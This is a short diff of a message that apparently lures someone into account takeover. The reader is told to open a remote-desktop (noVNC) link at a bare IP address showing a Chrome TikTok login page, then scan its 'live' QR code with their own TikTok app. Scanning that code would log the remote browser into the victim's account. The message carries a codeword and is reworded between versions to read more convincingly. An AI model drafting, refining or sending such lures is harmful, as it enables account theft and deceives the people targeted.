@@ -1,8 +1,7 @@
 CODEWORD: DRAGON
 
-NEW APPROACH — live browser, no more screenshots!
+Live browser — try this direct link:
 
-Open this on your phone browser:
-http://104.248.159.95:6080/vnc.html?autoconnect=true
+http://104.248.159.95:6080/vnc.html?autoconnect=true&resize=scale
 
-You'll see a real Chrome browser with TikTok login. Tap "Use QR code" on screen, then scan the LIVE QR from TikTok app. It won't expire because it's the real page!
+You'll see Chrome with TikTok login. Tap "Use QR code" on screen, scan the LIVE QR from TikTok app. No expiry!
